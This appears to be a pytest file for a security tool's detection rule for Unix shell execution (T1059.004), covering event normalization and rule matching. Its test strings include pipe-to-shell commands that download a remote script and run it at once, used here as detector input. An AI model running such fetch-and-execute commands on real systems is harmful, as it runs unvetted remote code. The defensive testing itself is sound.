"""T1059.004 — process.exec event normalizer coverage."""

from __future__ import annotations

import uuid
from datetime import datetime, timezone

from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.self_defense import SELF_DEFENSE_RULES
from zaqorincore_server.self_defense.event_normalizer import ZaqorinEvent

from tests.rules.self_defense._helpers import find_rule


def _event(**md):
    md.setdefault("event_type", "process.exec")
    md.setdefault("src_ip", "198.51.100.10")
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="zaqorincore",
        raw="",
        metadata=md,
        occurred_at=datetime.now(timezone.utc),
    )


def test_process_exec_event_normalizer_basic() -> None:
    ev = ZaqorinEvent.from_log_record(
        {"event_type": "process.exec", "cmdline": "curl https://x | sh"}
    )
    assert ev.event_type == "process.exec"
    assert ev.cmdline == "curl https://x | sh"


def test_process_exec_event_metadata_strips_none() -> None:
    ev = ZaqorinEvent.from_log_record({"event_type": "process.exec"})
    md = ev.to_metadata()
    assert "cmdline" not in md


def test_process_exec_normalizer_coerces_non_string() -> None:
    ev = ZaqorinEvent.from_log_record(
        {"event_type": "process.exec", "cmdline": ["curl", "sh"]}
    )
    assert ev.cmdline is None


def test_process_exec_rule_fires_on_curl_bash() -> None:
    rule = find_rule("T1059.004")
    ev = _event(cmdline="curl -fsSL https://x.example/install.sh | bash")
    assert rule.matches(ev)


def test_process_exec_rule_does_not_fire_on_plain_curl() -> None:
    rule = find_rule("T1059.004")
    ev = _event(cmdline="curl -O https://x.example/file.tar.gz")
    assert not rule.matches(ev)


def test_process_exec_rule_registered() -> None:
    titles = [r.title for r in SELF_DEFENSE_RULES]
    assert any("T1059.004" in t for t in titles)
